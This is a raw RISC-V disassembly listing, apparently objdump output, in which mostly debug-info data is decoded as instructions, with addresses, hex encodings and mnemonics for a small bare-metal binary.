     6f0:	4606                	lw	a2,64(sp)
     6f2:	1201                	addi	tp,tp,-32
     6f4:	0708                	addi	a0,sp,896
     6f6:	0000                	unimp
     6f8:	1706                	slli	a4,a4,0x21
     6fa:	04ff                	0x4ff
     6fc:	0000                	unimp
     6fe:	4706                	lw	a4,64(sp)
     700:	1201                	addi	tp,tp,-32
     702:	004e                	c.slli	zero,0x13
     704:	0000                	unimp
     706:	000c                	0xc
     708:	4e08                	lw	a0,24(a2)
     70a:	0000                	unimp
     70c:	1800                	addi	s0,sp,48
     70e:	09000007          	0x9000007
     712:	0082                	c.slli64	ra
     714:	0000                	unimp
     716:	0002                	c.slli64	zero
     718:	d81a                	sw	t1,48(sp)
     71a:	8506                	mv	a0,ra
     71c:	0702                	c.slli64	a4
     71e:	082d                	addi	a6,a6,11
     720:	0000                	unimp
     722:	00053717          	auipc	a4,0x53
     726:	0600                	addi	s0,sp,768
     728:	5c180287          	0x5c180287
     72c:	0000                	unimp
     72e:	0000                	unimp
     730:	0004e417          	auipc	s0,0x4e
     734:	0600                	addi	s0,sp,768
     736:	0288                	addi	a0,sp,320
     738:	dd12                	sw	tp,184(sp)
     73a:	0005                	c.nop	1
     73c:	0800                	addi	s0,sp,16
     73e:	0002d717          	auipc	a4,0x2d
     742:	0600                	addi	s0,sp,768
     744:	0289                	addi	t0,t0,2
     746:	2d10                	fld	fa2,24(a0)
     748:	0008                	0x8
     74a:	1000                	addi	s0,sp,32
     74c:	0005bd17          	auipc	s10,0x5b
     750:	0600                	addi	s0,sp,768
     752:	028a                	slli	t0,t0,0x2
     754:	0001c017          	auipc	zero,0x1c
     758:	2c00                	fld	fs0,24(s0)
     75a:	00024217          	auipc	tp,0x24
     75e:	0600                	addi	s0,sp,768
     760:	550f028b          	0x550f028b
     764:	0000                	unimp
     766:	5000                	lw	s0,32(s0)
     768:	00044417          	auipc	s0,0x44
     76c:	0600                	addi	s0,sp,768
     76e:	028c                	addi	a1,sp,320
     770:	3d2c                	fld	fa1,120(a0)
     772:	0008                	0x8
     774:	5800                	lw	s0,48(s0)
     776:	0005d317          	auipc	t1,0x5d
     77a:	0600                	addi	s0,sp,768
     77c:	028d                	addi	t0,t0,3
     77e:	cf1a                	sw	t1,156(sp)
     780:	0006                	c.slli	zero,0x1
     782:	6000                	ld	s0,0(s0)
     784:	00044f17          	auipc	t5,0x44
     788:	0600                	addi	s0,sp,768
     78a:	028e                	slli	t0,t0,0x3
     78c:	1e16                	slli	t3,t3,0x25
     78e:	0001                	nop
     790:	7000                	ld	s0,32(s0)
     792:	0005de17          	auipc	t3,0x5d
     796:	0600                	addi	s0,sp,768
     798:	1e16028f          	0x1e16028f
     79c:	0001                	nop
     79e:	7800                	ld	s0,48(s0)
     7a0:	0000cd17          	auipc	s10,0xc
     7a4:	0600                	addi	s0,sp,768
     7a6:	0290                	addi	a2,sp,320
     7a8:	1e16                	slli	t3,t3,0x25
     7aa:	0001                	nop
     7ac:	8000                	0x8000
     7ae:	00059017          	auipc	zero,0x59
     7b2:	0600                	addi	s0,sp,768
     7b4:	0291                	addi	t0,t0,4
     7b6:	4410                	lw	a2,8(s0)
     7b8:	0008                	0x8
     7ba:	8800                	0x8800
     7bc:	0002cb17          	auipc	s6,0x2c
     7c0:	0600                	addi	s0,sp,768
     7c2:	0292                	slli	t0,t0,0x4
     7c4:	5410                	lw	a2,40(s0)
     7c6:	0008                	0x8
     7c8:	9000                	0x9000
     7ca:	00050c17          	auipc	s8,0x50
     7ce:	0600                	addi	s0,sp,768
     7d0:	550f0293          	addi	t0,t5,1360 # 44cd4 <_tbss_end+0x44c50>
     7d4:	0000                	unimp
     7d6:	a800                	fsd	fs0,16(s0)
     7d8:	00020217          	auipc	tp,0x20
     7dc:	0600                	addi	s0,sp,768
     7de:	0294                	addi	a3,sp,320
     7e0:	1e16                	slli	t3,t3,0x25
     7e2:	0001                	nop
     7e4:	ac00                	fsd	fs0,24(s0)
     7e6:	0000b617          	auipc	a2,0xb
     7ea:	0600                	addi	s0,sp,768
     7ec:	0295                	addi	t0,t0,5
     7ee:	1e16                	slli	t3,t3,0x25
     7f0:	0001                	nop
     7f2:	b400                	fsd	fs0,40(s0)
     7f4:	0001f117          	auipc	sp,0x1f
     7f8:	0600                	addi	s0,sp,768
     7fa:	0296                	slli	t0,t0,0x5
     7fc:	1e16                	slli	t3,t3,0x25
     7fe:	0001                	nop
     800:	bc00                	fsd	fs0,56(s0)
     802:	00005317          	auipc	t1,0x5
     806:	0600                	addi	s0,sp,768
     808:	1e160297          	auipc	t0,0x1e160
     80c:	0001                	nop
     80e:	c400                	sw	s0,8(s0)
     810:	00006217          	auipc	tp,0x6
     814:	0600                	addi	s0,sp,768
     816:	0298                	addi	a4,sp,320
     818:	1e16                	slli	t3,t3,0x25
     81a:	0001                	nop
     81c:	cc00                	sw	s0,24(s0)
     81e:	0003f717          	auipc	a4,0x3f
     822:	0600                	addi	s0,sp,768
     824:	0299                	addi	t0,t0,6
     826:	5508                	lw	a0,40(a0)
     828:	0000                	unimp
     82a:	d400                	sw	s0,40(s0)
     82c:	0800                	addi	s0,sp,16
     82e:	000005e3          	beqz	zero,1038 <_tbss_end+0xfb4>
     832:	083d                	addi	a6,a6,15
     834:	0000                	unimp
     836:	8209                	srli	a2,a2,0x2
     838:	0000                	unimp
     83a:	1900                	addi	s0,sp,176
     83c:	0200                	addi	s0,sp,256
     83e:	0708                	addi	a0,sp,896
     840:	00000073          	ecall
     844:	e308                	sd	a0,0(a4)
     846:	0005                	c.nop	1
     848:	5400                	lw	s0,40(s0)
     84a:	0008                	0x8
     84c:	0900                	addi	s0,sp,144
     84e:	0082                	c.slli64	ra
     850:	0000                	unimp
     852:	e3080007          	0xe3080007
     856:	0005                	c.nop	1
     858:	6400                	ld	s0,8(s0)
     85a:	0008                	0x8
     85c:	0900                	addi	s0,sp,144
     85e:	0082                	c.slli64	ra
     860:	0000                	unimp
     862:	681b0017          	auipc	zero,0x681b0
     866:	0601                	addi	a2,a2,0
     868:	029e                	slli	t0,t0,0x7
     86a:	00088c07          	0x88c07
     86e:	1700                	addi	s0,sp,928
     870:	0351                	addi	t1,t1,20
     872:	0000                	unimp
     874:	a106                	fsd	ft1,128(sp)
     876:	1b02                	slli	s6,s6,0x20
     878:	088c                	addi	a1,sp,80
     87a:	0000                	unimp
     87c:	1700                	addi	s0,sp,928
     87e:	0332                	slli	t1,t1,0xc
     880:	0000                	unimp
     882:	a206                	fsd	ft1,256(sp)
     884:	1802                	slli	a6,a6,0x20
     886:	089c                	addi	a5,sp,80
     888:	0000                	unimp
     88a:	00f0                	addi	a2,sp,76
     88c:	2208                	fld	fa0,0(a2)
     88e:	9c000003          	lb	zero,-1600(zero) # fffffffffffff9c0 <_end+0xffffffff7ffe4500>
     892:	0008                	0x8
     894:	0900                	addi	s0,sp,144
     896:	0082                	c.slli64	ra
     898:	0000                	unimp
     89a:	001d                	c.nop	7
     89c:	5c08                	lw	a0,56(s0)
     89e:	0000                	unimp
     8a0:	ac00                	fsd	fs0,24(s0)
     8a2:	0008                	0x8
     8a4:	0900                	addi	s0,sp,144
     8a6:	0082                	c.slli64	ra
     8a8:	0000                	unimp
     8aa:	001d                	c.nop	7
     8ac:	681c                	ld	a5,16(s0)
     8ae:	0601                	addi	a2,a2,0
     8b0:	d2030283          	lb	t0,-736(t1) # 5522 <_tbss_end+0x549e>
     8b4:	0008                	0x8
     8b6:	1d00                	addi	s0,sp,688
     8b8:	0499                	addi	s1,s1,6
     8ba:	0000                	unimp
     8bc:	9a06                	add	s4,s4,ra
     8be:	0b02                	c.slli64	s6
     8c0:	0718                	addi	a4,sp,896
     8c2:	0000                	unimp
     8c4:	aa1d                	j	9fa <_tbss_end+0x976>
     8c6:	0005                	c.nop	1
     8c8:	0600                	addi	s0,sp,768
     8ca:	640b02a3          	sb	zero,1605(s6) # 2ce01 <_tbss_end+0x2cd7d>
     8ce:	0008                	0x8
     8d0:	0000                	unimp
     8d2:	e308                	sd	a0,0(a4)
     8d4:	0005                	c.nop	1
     8d6:	e200                	sd	s0,0(a2)
     8d8:	0008                	0x8
     8da:	0900                	addi	s0,sp,144
     8dc:	0082                	c.slli64	ra
     8de:	0000                	unimp
     8e0:	0018                	0x18
     8e2:	a21e                	fsd	ft7,256(sp)
     8e4:	0000                	unimp
     8e6:	0f00                	addi	s0,sp,912
     8e8:	e208                	sd	a0,0(a2)
     8ea:	0008                	0x8
     8ec:	1f00                	addi	s0,sp,944
     8ee:	08f8                	addi	a4,sp,92
     8f0:	0000                	unimp
     8f2:	8914                	0x8914
     8f4:	0004                	0x4
     8f6:	0000                	unimp
     8f8:	08ed080f          	0x8ed080f
     8fc:	0000                	unimp
     8fe:	01aa080f          	0x1aa080f
     902:	0000                	unimp
     904:	0f1f 0009 1400      	0x140000090f1f
     90a:	0055                	c.nop	21
     90c:	0000                	unimp
     90e:	0f00                	addi	s0,sp,912
     910:	1508                	addi	a0,sp,672
     912:	0009                	c.nop	2
     914:	0f00                	addi	s0,sp,912
     916:	0408                	addi	a0,sp,512
     918:	0009                	c.nop	2
     91a:	0800                	addi	s0,sp,16
     91c:	067d                	addi	a2,a2,31
     91e:	0000                	unimp
     920:	0000092b          	0x92b
     924:	8209                	srli	a2,a2,0x2
     926:	0000                	unimp
     928:	0200                	addi	s0,sp,256
     92a:	2000                	fld	fs0,0(s0)
     92c:	0520                	addi	s0,sp,648
     92e:	0000                	unimp
     930:	3306                	fld	ft6,96(sp)
     932:	04891703          	lh	a4,72(s2) # 446e0 <_tbss_end+0x4465c>
     936:	0000                	unimp
     938:	1920                	addi	s0,sp,184
     93a:	0005                	c.nop	1
     93c:	0600                	addi	s0,sp,768
     93e:	0334                	addi	a3,sp,392
     940:	8f1d                	sub	a4,a4,a5
     942:	0004                	0x4
     944:	0300                	addi	s0,sp,384
     946:	00000037          	lui	zero,0x0
     94a:	1808                	addi	a0,sp,48
     94c:	00003413          	sltiu	s0,zero,0
     950:	0300                	addi	s0,sp,384
     952:	009a                	slli	ra,ra,0x6
     954:	0000                	unimp
     956:	3808                	fld	fa0,48(s0)
     958:	00006313          	ori	t1,zero,0
     95c:	0300                	addi	s0,sp,384
     95e:	03a2                	slli	t2,t2,0x8
     960:	0000                	unimp
     962:	3c08                	fld	fa0,56(s0)
     964:	7614                	ld	a3,40(a2)
     966:	0000                	unimp
     968:	2100                	fld	fs0,0(a0)
     96a:	0376                	slli	t1,t1,0x1d
     96c:	0000                	unimp
     96e:	6709                	lui	a4,0x2
     970:	dd0e                	sw	gp,184(sp)
     972:	0005                	c.nop	1
     974:	0800                	addi	s0,sp,16
     976:	0945                	addi	s2,s2,17
     978:	0000                	unimp
     97a:	0988                	addi	a0,sp,208
     97c:	0000                	unimp
     97e:	8222                	mv	tp,s0
     980:	0000                	unimp
     982:	ff00                	sd	s0,56(a4)
     984:	0000013f 0003e923 	0x3e9230000013f
     98c:	0100                	addi	s0,sp,128
     98e:	0939                	addi	s2,s2,14
     990:	0975                	addi	s2,s2,29
     992:	0000                	unimp
     994:	0309                	addi	t1,t1,2
     996:	2c00                	fld	fs0,24(s0)
     998:	8000                	0x8000
     99a:	0000                	unimp
     99c:	0000                	unimp
     99e:	0005f923          	0x5f923
     9a2:	0200                	addi	s0,sp,256
     9a4:	0a0e                	slli	s4,s4,0x3
     9a6:	095d                	addi	s2,s2,23
     9a8:	0000                	unimp
     9aa:	0309                	addi	t1,t1,2
     9ac:	2be0                	fld	fs0,208(a5)
     9ae:	8000                	0x8000
     9b0:	0000                	unimp
     9b2:	0000                	unimp
     9b4:	4508                	lw	a0,8(a0)
     9b6:	0009                	c.nop	2
     9b8:	c400                	sw	s0,8(s0)
     9ba:	0009                	c.nop	2
     9bc:	0900                	addi	s0,sp,144
     9be:	0082                	c.slli64	ra
     9c0:	0000                	unimp
     9c2:	1123003f 02000000 	0x20000001123003f
     9ca:	09b4090f          	0x9b4090f
     9ce:	0000                	unimp
     9d0:	0309                	addi	t1,t1,2
     9d2:	6c00                	ld	s0,24(s0)
     9d4:	8001                	c.srli64	s0
     9d6:	0000                	unimp
     9d8:	0000                	unimp
     9da:	4508                	lw	a0,8(a0)
     9dc:	0009                	c.nop	2
     9de:	ea00                	sd	s0,16(a2)
     9e0:	0009                	c.nop	2
     9e2:	0900                	addi	s0,sp,144
     9e4:	0082                	c.slli64	ra
     9e6:	0000                	unimp
     9e8:	009f 9223 0003      	0x39223009f
     9ee:	0200                	addi	s0,sp,256
     9f0:	0910                	addi	a2,sp,144
     9f2:	09da                	slli	s3,s3,0x16
     9f4:	0000                	unimp
     9f6:	0309                	addi	t1,t1,2
     9f8:	2b40                	fld	fs0,144(a4)
     9fa:	8000                	0x8000
     9fc:	0000                	unimp
     9fe:	0000                	unimp
     a00:	00032323          	sw	zero,6(t1)
     a04:	0200                	addi	s0,sp,256
     a06:	0911                	addi	s2,s2,4
     a08:	09b4                	addi	a3,sp,216
     a0a:	0000                	unimp
     a0c:	0309                	addi	t1,t1,2
     a0e:	6c40                	ld	s0,152(s0)
     a10:	8001                	c.srli64	s0
     a12:	0000                	unimp
     a14:	0000                	unimp
     a16:	4508                	lw	a0,8(a0)
     a18:	0009                	c.nop	2
     a1a:	2700                	fld	fs0,8(a4)
     a1c:	000a                	c.slli	zero,0x2
     a1e:	2400                	fld	fs0,8(s0)
     a20:	0082                	c.slli64	ra
     a22:	0000                	unimp
     a24:	3fff                	0x3fff
     a26:	2300                	fld	fs0,0(a4)
     a28:	0399                	addi	t2,t2,6
     a2a:	0000                	unimp
     a2c:	1202                	slli	tp,tp,0x20
     a2e:	1609                	addi	a2,a2,-30
     a30:	000a                	c.slli	zero,0x2
     a32:	0900                	addi	s0,sp,144
     a34:	016c8003          	lb	zero,22(s9)
     a38:	0080                	addi	s0,sp,64
     a3a:	0000                	unimp
     a3c:	2300                	fld	fs0,0(a4)
     a3e:	0358                	addi	a4,sp,388
     a40:	0000                	unimp
     a42:	1302                	slli	t1,t1,0x20
     a44:	0005dd07          	0x5dd07
     a48:	0900                	addi	s0,sp,144
     a4a:	002be803          	lwu	a6,2(s7)
     a4e:	0080                	addi	s0,sp,64
     a50:	0000                	unimp
     a52:	2500                	fld	fs0,8(a0)
     a54:	00000603          	lb	a2,0(zero) # 0 <_tdata_begin>
     a58:	4f02                	lw	t5,0(sp)
     a5a:	5505                	li	a0,-31
     a5c:	0000                	unimp
     a5e:	b800                	fsd	fs0,48(s0)
     a60:	0012                	c.slli	zero,0x4
     a62:	0080                	addi	s0,sp,64
     a64:	0000                	unimp
     a66:	1800                	addi	s0,sp,48
     a68:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     a6c:	0000                	unimp
     a6e:	0100                	addi	s0,sp,128
     a70:	509c                	lw	a5,32(s1)
     a72:	000c                	0xc
     a74:	2600                	fld	fs0,8(a2)
     a76:	0000012b          	0x12b
     a7a:	5002                	0x5002
     a7c:	5d0e                	lw	s10,224(sp)
     a7e:	0009                	c.nop	2
     a80:	0200                	addi	s0,sp,256
     a82:	6891                	lui	a7,0x4
     a84:	d826                	sw	s1,48(sp)
     a86:	0005                	c.nop	1
     a88:	0200                	addi	s0,sp,256
     a8a:	0e51                	addi	t3,t3,20
     a8c:	095d                	addi	s2,s2,23
     a8e:	0000                	unimp
     a90:	7f989103          	lh	sp,2041(a7) # 47f9 <_tbss_end+0x4775>
     a94:	f126                	sd	s1,160(sp)
     a96:	0004                	0x4
     a98:	0200                	addi	s0,sp,256
     a9a:	1551                	addi	a0,a0,-12
     a9c:	095d                	addi	s2,s2,23
     a9e:	0000                	unimp
     aa0:	7f889103          	lh	sp,2040(a7)
     aa4:	4926                	lw	s2,72(sp)
     aa6:	0000                	unimp
     aa8:	0200                	addi	s0,sp,256
     aaa:	1b51                	addi	s6,s6,-12
     aac:	095d                	addi	s2,s2,23
     aae:	0000                	unimp
     ab0:	7ef89103          	lh	sp,2031(a7)
     ab4:	c526                	sw	s1,136(sp)
     ab6:	0000                	unimp
     ab8:	0200                	addi	s0,sp,256
     aba:	2651                	addiw	a2,a2,20
     abc:	095d                	addi	s2,s2,23
     abe:	0000                	unimp
     ac0:	7f809103          	lh	sp,2040(ra)
     ac4:	0826                	slli	a6,a6,0x9
     ac6:	0001                	nop
     ac8:	0200                	addi	s0,sp,256
     aca:	0d52                	slli	s10,s10,0x14
     acc:	0945                	addi	s2,s2,17
     ace:	0000                	unimp
     ad0:	9102                	jalr	sp
     ad2:	05ec2667          	0x5ec2667
     ad6:	0000                	unimp
     ad8:	5302                	lw	t1,32(sp)
     ada:	5015                	c.li	zero,-27
     adc:	000c                	0xc
     ade:	0900                	addi	s0,sp,144
     ae0:	01ac8003          	lb	zero,26(s9)
     ae4:	0080                	addi	s0,sp,64
     ae6:	0000                	unimp
     ae8:	2700                	fld	fs0,8(a4)
     aea:	1302                	slli	t1,t1,0x20
     aec:	8000                	0x8000
     aee:	0000                	unimp
     af0:	0000                	unimp
     af2:	02c2                	slli	t0,t0,0x10
     af4:	0000                	unimp
     af6:	0000                	unimp
     af8:	0000                	unimp
     afa:	6c28                	ld	a0,88(s0)
     afc:	6e65                	lui	t3,0x19
     afe:	0200                	addi	s0,sp,256
     b00:	125f 095d 0000      	0x95d125f
     b06:	9102                	jalr	sp
     b08:	2758                	fld	fa4,136(a4)
     b0a:	1308                	addi	a0,sp,416
     b0c:	8000                	0x8000
     b0e:	0000                	unimp
     b10:	0000                	unimp
     b12:	02a8                	addi	a0,sp,328
     b14:	0000                	unimp
     b16:	0000                	unimp
     b18:	0000                	unimp
     b1a:	2b26                	fld	fs6,72(sp)
     b1c:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     b20:	0c601193          	0xc601193
     b24:	0000                	unimp
     b26:	7ef09103          	lh	sp,2031(ra)
     b2a:	ad26                	fsd	fs1,152(sp)
     b2c:	0000                	unimp
     b2e:	0200                	addi	s0,sp,256
     b30:	1294                	addi	a3,sp,352
     b32:	0c70                	addi	a2,sp,540
     b34:	0000                	unimp
     b36:	7ee09103          	lh	sp,2030(ra)
     b3a:	0829                	addi	a6,a6,10
     b3c:	00800013          	li	zero,8
     b40:	0000                	unimp
     b42:	3000                	fld	fs0,32(s0)
     b44:	0000                	unimp
     b46:	0000                	unimp
     b48:	0000                	unimp
     b4a:	5f00                	lw	s0,56(a4)
     b4c:	2600000b          	0x2600000b
     b50:	04cd                	addi	s1,s1,19
     b52:	0000                	unimp
     b54:	6202                	ld	tp,0(sp)
     b56:	5d16                	lw	s10,100(sp)
     b58:	0009                	c.nop	2
     b5a:	0200                	addi	s0,sp,256
     b5c:	5091                	li	ra,-28
     b5e:	2700                	fld	fs0,8(a4)
     b60:	1338                	addi	a4,sp,424
     b62:	8000                	0x8000
     b64:	0000                	unimp
     b66:	0000                	unimp
     b68:	0158                	addi	a4,sp,132
     b6a:	0000                	unimp
     b6c:	0000                	unimp
     b6e:	0000                	unimp
     b70:	1926                	slli	s2,s2,0x29
     b72:	0000                	unimp
     b74:	0200                	addi	s0,sp,256
     b76:	095d1667          	0x95d1667
     b7a:	0000                	unimp
     b7c:	9102                	jalr	sp
     b7e:	2948                	fld	fa0,144(a0)
     b80:	134e                	slli	t1,t1,0x33
     b82:	8000                	0x8000
     b84:	0000                	unimp
     b86:	0000                	unimp
     b88:	0094                	addi	a3,sp,64
     b8a:	0000                	unimp
     b8c:	0000                	unimp
     b8e:	0000                	unimp
     b90:	0bc2                	slli	s7,s7,0x10
     b92:	0000                	unimp
     b94:	6a28                	ld	a0,80(a2)
     b96:	0200                	addi	s0,sp,256
     b98:	196c                	addi	a1,sp,188
     b9a:	0951                	addi	s2,s2,20
     b9c:	0000                	unimp
     b9e:	9102                	jalr	sp
     ba0:	2740                	fld	fs0,136(a4)
     ba2:	13ac                	addi	a1,sp,488
     ba4:	8000                	0x8000
     ba6:	0000                	unimp
     ba8:	0000                	unimp
     baa:	001c                	0x1c
     bac:	0000                	unimp
     bae:	0000                	unimp
     bb0:	0000                	unimp
     bb2:	6b28                	ld	a0,80(a4)
     bb4:	0200                	addi	s0,sp,256
     bb6:	095d1e77          	0x95d1e77
     bba:	0000                	unimp
     bbc:	7fb89103          	lh	sp,2043(a7)
     bc0:	0000                	unimp
     bc2:	0013e227          	0x13e227
     bc6:	0080                	addi	s0,sp,64
     bc8:	0000                	unimp
     bca:	9a00                	0x9a00
     bcc:	0000                	unimp
     bce:	0000                	unimp
     bd0:	0000                	unimp
     bd2:	2800                	fld	fs0,16(s0)
     bd4:	0069                	c.nop	26
     bd6:	8302                	jr	t1
     bd8:	00095d1b          	srliw	s10,s2,0x0
     bdc:	0300                	addi	s0,sp,384
     bde:	b091                	j	422 <_tbss_end+0x39e>
     be0:	277f                	0x277f
     be2:	13e8                	addi	a0,sp,492
     be4:	8000                	0x8000
     be6:	0000                	unimp
     be8:	0000                	unimp
     bea:	007e                	c.slli	zero,0x1f
     bec:	0000                	unimp
     bee:	0000                	unimp
     bf0:	0000                	unimp
     bf2:	ab26                	fsd	fs1,400(sp)
     bf4:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     bf8:	1b84                	addi	s1,sp,496
     bfa:	095d                	addi	s2,s2,23
     bfc:	0000                	unimp
     bfe:	7fa89103          	lh	sp,2042(a7)
     c02:	ec29                	bnez	s0,c5c <_tbss_end+0xbd8>
     c04:	00800013          	li	zero,8
     c08:	0000                	unimp
     c0a:	0c00                	addi	s0,sp,528
     c0c:	0000                	unimp
     c0e:	0000                	unimp
     c10:	0000                	unimp
     c12:	2800                	fld	fs0,16(s0)
     c14:	000c                	0xc
     c16:	2600                	fld	fs0,8(a2)
     c18:	00000223          	sb	zero,4(zero) # 4 <_tdata_begin+0x4>
     c1c:	8502                	jr	a0
     c1e:	8219                	srli	a2,a2,0x6
     c20:	0000                	unimp
     c22:	0300                	addi	s0,sp,384
     c24:	a091                	j	c68 <_tbss_end+0xbe4>
     c26:	007f                	0x7f
     c28:	00141a27          	0x141a27
     c2c:	0080                	addi	s0,sp,64
     c2e:	0000                	unimp
     c30:	0c00                	addi	s0,sp,528
     c32:	0000                	unimp
     c34:	0000                	unimp
     c36:	0000                	unimp
     c38:	2600                	fld	fs0,8(a2)
     c3a:	00000223          	sb	zero,4(zero) # 4 <_tdata_begin+0x4>
     c3e:	8702                	jr	a4
     c40:	8219                	srli	a2,a2,0x6
     c42:	0000                	unimp
     c44:	0300                	addi	s0,sp,384
     c46:	9091                	srli	s1,s1,0x24
     c48:	007f                	0x7f
     c4a:	0000                	unimp
     c4c:	0000                	unimp
     c4e:	0000                	unimp
     c50:	5d08                	lw	a0,56(a0)
     c52:	0009                	c.nop	2
     c54:	6000                	ld	s0,0(s0)
     c56:	000c                	0xc
     c58:	0900                	addi	s0,sp,144
     c5a:	0082                	c.slli64	ra
     c5c:	0000                	unimp
     c5e:	00ff                	0xff
     c60:	4508                	lw	a0,8(a0)
     c62:	0009                	c.nop	2
     c64:	7000                	ld	s0,32(s0)
     c66:	000c                	0xc
     c68:	0900                	addi	s0,sp,144
     c6a:	0082                	c.slli64	ra
     c6c:	0000                	unimp
     c6e:	0001                	nop
     c70:	5d08                	lw	a0,56(a0)
     c72:	0009                	c.nop	2
     c74:	8000                	0x8000
     c76:	000c                	0xc
     c78:	0900                	addi	s0,sp,144
     c7a:	0082                	c.slli64	ra
     c7c:	0000                	unimp
     c7e:	0001                	nop
     c80:	072a                	slli	a4,a4,0xa
     c82:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     c86:	12060637          	lui	a2,0x12060
     c8a:	8000                	0x8000
     c8c:	0000                	unimp
     c8e:	0000                	unimp
     c90:	00b2                	slli	ra,ra,0xc
     c92:	0000                	unimp
     c94:	0000                	unimp
     c96:	0000                	unimp
     c98:	9c01                	subw	s0,s0,s0
     c9a:	0cde                	slli	s9,s9,0x17
     c9c:	0000                	unimp
     c9e:	7864692b          	0x7864692b
     ca2:	0200                	addi	s0,sp,256
     ca4:	095d1a37          	lui	s4,0x95d1
     ca8:	0000                	unimp
     caa:	9102                	jalr	sp
     cac:	2658                	fld	fa4,136(a2)
     cae:	0108                	addi	a0,sp,128
     cb0:	0000                	unimp
     cb2:	3802                	fld	fa6,32(sp)
     cb4:	450d                	li	a0,3
     cb6:	0009                	c.nop	2
     cb8:	0200                	addi	s0,sp,256
     cba:	6f91                	lui	t6,0x4
     cbc:	0012a027          	fsw	ft1,0(t0) # 1e160808 <_tbss_end+0x1e160784>
     cc0:	0080                	addi	s0,sp,64
     cc2:	0000                	unimp
     cc4:	0c00                	addi	s0,sp,528
     cc6:	0000                	unimp
     cc8:	0000                	unimp
     cca:	0000                	unimp
     ccc:	2600                	fld	fs0,8(a2)
     cce:	00000223          	sb	zero,4(zero) # 4 <_tdata_begin+0x4>
     cd2:	4c02                	lw	s8,0(sp)
     cd4:	820d                	srli	a2,a2,0x3
     cd6:	0000                	unimp
     cd8:	0200                	addi	s0,sp,256
     cda:	6091                	lui	ra,0x4
     cdc:	0000                	unimp
     cde:	3b2a                	fld	fs6,168(sp)
     ce0:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     ce4:	061f 1118 8000      	0x80001118061f
     cea:	0000                	unimp
     cec:	0000                	unimp
     cee:	00ee                	slli	ra,ra,0x1b
     cf0:	0000                	unimp
     cf2:	0000                	unimp
     cf4:	0000                	unimp
     cf6:	9c01                	subw	s0,s0,s0
     cf8:	0d58                	addi	a4,sp,660
     cfa:	0000                	unimp
     cfc:	892c                	0x892c
     cfe:	0002                	c.slli64	zero
     d00:	0200                	addi	s0,sp,256
     d02:	1a1f 0d58 0000      	0xd581a1f
     d08:	9102                	jalr	sp
     d0a:	2c58                	fld	fa4,152(s0)
     d0c:	0266                	slli	tp,tp,0x19
     d0e:	0000                	unimp
     d10:	1f02                	slli	t5,t5,0x20
     d12:	5d2c                	lw	a1,120(a0)
     d14:	0009                	c.nop	2
     d16:	0200                	addi	s0,sp,256
     d18:	5091                	li	ra,-28
     d1a:	d22c                	sw	a1,96(a2)
     d1c:	0004                	0x4
     d1e:	0200                	addi	s0,sp,256
     d20:	421f 0d5e 0000      	0xd5e421f
     d26:	9102                	jalr	sp
     d28:	2c48                	fld	fa0,152(s0)
     d2a:	0000015b          	0x15b
     d2e:	1f02                	slli	t5,t5,0x20
     d30:	5859                	li	a6,-10
     d32:	000d                	c.nop	3
     d34:	0200                	addi	s0,sp,256
     d36:	4091                	li	ra,4
     d38:	00114027          	fsq	ft1,0(sp) # 1f7f4 <_tbss_end+0x1f770>
     d3c:	0080                	addi	s0,sp,64
     d3e:	0000                	unimp
     d40:	bc00                	fsd	fs0,56(s0)
     d42:	0000                	unimp
     d44:	0000                	unimp
     d46:	0000                	unimp
     d48:	2800                	fld	fs0,16(s0)
     d4a:	0069                	c.nop	26
     d4c:	2302                	fld	ft6,0(sp)
     d4e:	00095d13          	srli	s10,s2,0x0
     d52:	0200                	addi	s0,sp,256
     d54:	6891                	lui	a7,0x4
     d56:	0000                	unimp
     d58:	095d080f          	0x95d080f
     d5c:	0000                	unimp
     d5e:	0945080f          	0x945080f
     d62:	0000                	unimp
     d64:	c02d                	beqz	s0,dc6 <_tbss_end+0xd42>
     d66:	0002                	c.slli64	zero
     d68:	0100                	addi	s0,sp,128
     d6a:	0646                	slli	a2,a2,0x11
     d6c:	1048                	addi	a0,sp,36
     d6e:	8000                	0x8000
     d70:	0000                	unimp
     d72:	0000                	unimp
     d74:	00d0                	addi	a2,sp,68
     d76:	0000                	unimp
     d78:	0000                	unimp
     d7a:	0000                	unimp
     d7c:	9c01                	subw	s0,s0,s0
     d7e:	932c                	0x932c
     d80:	0000                	unimp
     d82:	0100                	addi	s0,sp,128
     d84:	1a46                	slli	s4,s4,0x31
     d86:	095d                	addi	s2,s2,23
     d88:	0000                	unimp
     d8a:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
     d8e:	007a732b          	0x7a732b
     d92:	4601                	li	a2,0
     d94:	5d29                	li	s10,-22
     d96:	0009                	c.nop	2
     d98:	0300                	addi	s0,sp,384
     d9a:	a091                	j	dde <_tbss_end+0xd5a>
     d9c:	267f                	0x267f
     d9e:	03ce                	slli	t2,t2,0x13
     da0:	0000                	unimp
     da2:	4c01                	li	s8,0
     da4:	5d0e                	lw	s10,224(sp)
     da6:	0009                	c.nop	2
     da8:	0200                	addi	s0,sp,256
     daa:	6891                	lui	a7,0x4
     dac:	0826                	slli	a6,a6,0x9
     dae:	0001                	nop
     db0:	0100                	addi	s0,sp,128
     db2:	09450d5b          	0x9450d5b
     db6:	0000                	unimp
     db8:	9102                	jalr	sp
     dba:	052c2657          	0x52c2657
     dbe:	0000                	unimp
     dc0:	6101                	0x6101
     dc2:	5d0e                	lw	s10,224(sp)
     dc4:	0009                	c.nop	2
     dc6:	0200                	addi	s0,sp,256
     dc8:	4891                	li	a7,4
     dca:	0010a027          	fsw	ft1,0(ra) # 4000 <_tbss_end+0x3f7c>
     dce:	0080                	addi	s0,sp,64
     dd0:	0000                	unimp
     dd2:	6e00                	ld	s0,24(a2)
     dd4:	0000                	unimp
     dd6:	0000                	unimp
     dd8:	0000                	unimp
     dda:	2800                	fld	fs0,16(s0)
     ddc:	0069                	c.nop	26
     dde:	6401                	0x6401
     de0:	00095d13          	srli	s10,s2,0x0
     de4:	0200                	addi	s0,sp,256
     de6:	6091                	lui	ra,0x4
     de8:	0010a627          	fsw	ft1,12(ra) # 400c <_tbss_end+0x3f88>
     dec:	0080                	addi	s0,sp,64
     dee:	0000                	unimp
     df0:	5200                	lw	s0,32(a2)
     df2:	0000                	unimp
     df4:	0000                	unimp
     df6:	0000                	unimp
